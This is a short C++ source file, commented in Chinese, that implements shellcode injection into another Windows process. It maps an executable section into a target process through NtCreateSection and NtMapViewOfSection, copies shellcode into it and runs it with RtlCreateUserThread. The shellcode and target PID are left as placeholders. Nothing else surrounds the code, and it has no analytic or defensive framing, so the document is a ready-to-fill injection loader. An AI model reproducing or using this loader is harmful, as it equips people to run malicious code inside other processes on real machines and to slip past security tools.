#include <iostream>
#include <Windows.h>
#pragma comment(lib, "ntdll")

typedef NTSTATUS(NTAPI* myNtCreateSection)(PHANDLE, ULONG, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS(NTAPI* myNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS(NTAPI* myRtlCreateUserThread)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, PULONG, PULONG, PVOID, PVOID, PHANDLE, PCLIENT_ID);

int main() {
    unsigned char shellcode[] = "..."; // 你的shellcode
    SIZE_T size = 4096;
    LARGE_INTEGER sectionSize = { size };
    HANDLE sectionHandle = NULL;
    PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;

    myNtCreateSection fNtCreateSection = (myNtCreateSection)GetProcAddress(GetModuleHandleA("ntdll"), "NtCreateSection");
    myNtMapViewOfSection fNtMapViewOfSection = (myNtMapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll"), "NtMapViewOfSection");
    myRtlCreateUserThread fRtlCreateUserThread = (myRtlCreateUserThread)GetProcAddress(GetModuleHandleA("ntdll"), "RtlCreateUserThread");

    // 创建内存段
    fNtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    // 在本地进程中映射内存段
    fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);
    // 在目标进程中映射内存段
    HANDLE targetHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 目标进程PID);
    fNtMapViewOfSection(sectionHandle, targetHandle, &remoteSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ);
    // 将shellcode写入本地内存段
    memcpy(localSectionAddress, shellcode, sizeof(shellcode));
    // 创建远程线程执行shellcode
    HANDLE targetThreadHandle = NULL;
    fRtlCreateUserThread(targetHandle, NULL, FALSE, 0, 0, 0, remoteSectionAddress, NULL, &targetThreadHandle, NULL);

    return 0;
}
